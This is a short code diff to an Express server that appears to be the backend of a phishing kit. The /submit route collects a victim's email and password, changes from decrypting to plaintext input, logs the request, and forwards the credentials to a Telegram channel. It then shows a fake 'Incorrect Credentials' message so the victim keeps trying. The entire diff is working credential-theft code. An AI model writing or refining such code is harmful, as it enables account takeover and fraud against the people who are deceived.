@@ -49,22 +49,24 @@ function decryptPassword(encrypted) {
 
 app.post("/submit", async (req, res) => {
   try {
-    const { email, encryptedPassword } = req.body;
-    if (!email || !encryptedPassword) {
+    console.log("Received data:", req.body); // 🔥 Logs incoming data to debug
+
+    const { email, password } = req.body;
+    if (!email || !password) {
       return res
         .status(400)
         .json({ status: "error", message: "Missing fields" });
     }
 
-    const decryptedPassword = decryptPassword(encryptedPassword); // 🔥 Decrypt password
+    const decryptedPassword = password; // No need to decrypt since frontend sends plaintext
 
     await sendToTelegram(
       `📧 Email: ${email}\n🔑 Password: ${decryptedPassword}`
-    ); // 🔥 Send real password
+    );
 
     res.json({
       status: "success",
-      message: "Invalid credentials, please try again!",
+      message: "Incorrect Credentials, please try again!",
     });
   } catch (error) {
     console.error("Error processing request:", error);
